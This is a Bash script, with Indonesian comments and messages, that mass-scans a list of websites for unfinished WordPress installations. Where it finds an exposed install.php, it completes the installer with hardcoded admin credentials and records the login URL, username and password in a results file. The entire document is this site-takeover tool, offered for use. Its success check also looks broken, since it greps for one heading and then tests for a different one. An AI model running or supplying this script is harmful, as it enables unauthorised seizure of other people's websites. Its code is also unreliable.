#Gak Ada Author
#Silahkan Tambahkan Koder Jika Kalian Ingin Jadi Progremer
#!/bin/bash
clear
biru='\033[34;1m' 
ungu='\033[35;1m' 
cyan='\033[0;36m'
green='\e[92m'
red='\033[0;31m'
gass(){
       if [[ $(curl -s -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" $site/wp-admin/install.php | grep -o 'English (United States)') =~ 'English (United States)' ]];
      then 
      echo "[+] Kayaknya Vuln"
      local exploit=$(curl --silent -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -d "weblog_title=Wanjayy&user_name=Bayy&admin_password=Youu&admin_password2=Youu&admin_email=$email" $site/wp-admin/install.php?step=2 | grep -o '<h1>Success!</h1>')
      if [[ $exploit =~ '<h1>Berhasil!</h1>' ]];
      then
      printf "$green[+] Sukses Install!\n"
      echo "$site/wp-login.php" | tee -a result_ins.txt
      echo "Username = Bayy" | tee -a result_ins.txt
      echo "Password = Youu" | tee -a result_ins.txt
      else
      printf "$red[-] Gagal!!\n"
      fi
     else
    printf "$red[-] Gak Vuln Jancok\n"
   fi
     }
read -p "Masukan List Target : " list
read -p "Email Mu : " email
for site in $(cat $list); do
      printf "$cyan[Try] $site \n"
      gass $site $email
    done
